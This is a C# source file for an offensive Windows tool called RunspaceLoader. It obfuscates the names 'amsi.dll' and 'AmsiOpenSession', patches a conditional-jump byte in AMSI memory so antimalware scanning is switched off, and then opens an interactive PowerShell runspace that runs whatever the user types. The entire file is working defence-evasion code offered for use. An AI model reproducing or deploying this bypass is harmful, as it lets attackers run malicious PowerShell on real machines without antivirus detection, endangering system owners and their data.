#define AMSI

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Globalization;
using System.Management.Automation.Host;
using System.Collections.ObjectModel;
using System.Runtime.InteropServices;
using System.Data.OleDb;
using System.Security.Cryptography;
using System.Xml.Linq;
using System.Security;

namespace RunspaceLoader
{

    internal class Program
    {
        [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)] string lpFileplaceholder);
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procplaceholder);
        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, UInt32 dwSize, uint flNewProtect, out uint lpflOldProtect);

        static UInt64 getAddr(IntPtr openSessionPtr)
        {
            unsafe
            {
                // Find the first instance of the 0x74 byte aka the JZ instruction
                byte* pByte = (byte*)openSessionPtr.ToPointer();
                for (int i = 0; i < 1024; i++)
                {
                    // Console.WriteLine("Looking through each byte: 0x{0}", (*(pByte + i)).ToString("X2"));
                    if (*(pByte + i) == 0x74)
                    {
                        // When found, return the address
                        // Console.WriteLine("Found first JZ after incrementing: " + i);
                        // Console.WriteLine("Found Here: 0x{0}", (*(pByte + i)).ToString("X2"));
                        return (UInt64)openSessionPtr.ToInt64() + (ulong)i;
                    }
                }
                return 0;
            }
        }
        static void Main()
        {
#if AMSI
            char[] data = "lld.isma".ToCharArray();
            Array.Reverse(data);
            string dll = new string(data);

            //var a = LoadLibrary(placeholder);
            data = "noisseSnepOismA".ToCharArray();
            Array.Reverse(data);
            string func = new string(data);

            byte[] patch = new byte[] { 0x75 };

            var b = GetProcAddress(LoadLibrary(dll), func);
            IntPtr addr = (IntPtr)getAddr(b);
            //Console.WriteLine("Retrieved address of JZ instruction: 0x{0}", addr.ToString("X2"));

            _ = VirtualProtect(addr, 1, 0x04, out uint oldProtect);
            
            Marshal.Copy(patch, 0, addr, 1);
            Console.WriteLine("[+] AMSI Patched");

            // Restore Region to RX
            _ = VirtualProtect(addr, 1, oldProtect, out uint _);
            Console.WriteLine("[+] Old permissions restored. Tread carefully!\n\n");
#endif
            string userInput;

            do
            {
                Console.Write("[limited shell] ~$ ");
                userInput = Console.ReadLine();
                StringBuilder sb = new StringBuilder();

                // TODO 
                /*              InitialSessionState initialSessionState = InitialSessionState.CreateDefault();
                                initialSessionState.ExecutionPolicy = Microsoft.PowerShell.ExecutionPolicy.Bypass;*/
                var myHost = new CustomPSHost();
                var initialSessionState = InitialSessionState.CreateDefault();
                using (var runspace = RunspaceFactory.CreateRunspace(myHost, initialSessionState))
                {
                    runspace.Open();

                    using (var pipeline = runspace.CreatePipeline())
                    {
                        pipeline.Commands.AddScript(userInput);
                        // pipeline.Commands.Add("Out-String");

                        try
                        {
                            Collection<PSObject> output = pipeline.Invoke();
                            foreach (PSObject line in output)
                            {
                                sb.AppendLine(line.ToString());
                            }
                        }
                        catch (Exception ex)
                        {
                            sb.AppendLine("Error: " + ex.Message);
                        }
                    }
                    runspace.Close();
                }

                Console.WriteLine(sb.ToString());
                Console.WriteLine(myHost.Output);
            }
            while (userInput != "exit");
        }
    }
}